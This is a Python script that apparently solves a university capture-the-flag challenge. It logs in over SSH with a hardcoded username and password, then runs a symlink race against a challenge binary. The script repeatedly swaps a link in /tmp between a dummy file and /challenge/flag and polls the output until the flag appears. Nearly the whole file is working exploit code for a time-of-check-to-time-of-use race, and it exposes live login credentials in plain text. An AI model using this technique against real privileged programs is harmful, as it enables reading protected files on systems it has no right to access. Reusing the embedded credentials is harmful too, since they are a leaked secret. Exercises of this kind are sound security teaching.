import paramiko
import time
import threading

HOST = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 25651
USERNAME = "SSof_70"
PASSWORD = "5NzZMQHLbJ"

TMP_DIR = "/tmp/jesuistresdumb"
POINTER = f"{TMP_DIR}/pointer"
DUMMY = f"{TMP_DIR}/dummy"
CHALLENGE = "/challenge/challenge"
FLAG = "/challenge/flag"

stop = False

def race_loop(ssh_client):
    global stop

    while not stop:
        cmd = f"""
        touch {DUMMY} ;
        ln -sf {DUMMY} {POINTER} ;
        (echo "{POINTER}" | {CHALLENGE} > {TMP_DIR}/out.txt 2>/dev/null &) ;
        rm -f {POINTER} ;
        ln -sf {FLAG} {POINTER}
        """
        ssh_client.exec_command(cmd)
        time.sleep(0.002)


def monitor(ssh_client):
    global stop

    while not stop:
        stdin, stdout, stderr = ssh_client.exec_command(f"cat {TMP_DIR}/out.txt")
        output = stdout.read().decode(errors="ignore")
        print(output)

        if "SSof{" in output:
            print("\nFLAG CAPTURED:\n")
            print(output)
            stop = True
            return

        time.sleep(0.05)
        

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect(HOST, port=PORT, username=USERNAME, password=PASSWORD)

client.exec_command(f"mkdir -p {TMP_DIR}")
client.exec_command(f"rm -rf {TMP_DIR}/*")

t1 = threading.Thread(target=race_loop, args=(client,))
t2 = threading.Thread(target=monitor, args=(client,))
t1.start()
t2.start()

t1.join()
t2.join()
client.exec_command(f"rm -rf {TMP_DIR}/*")
client.close()
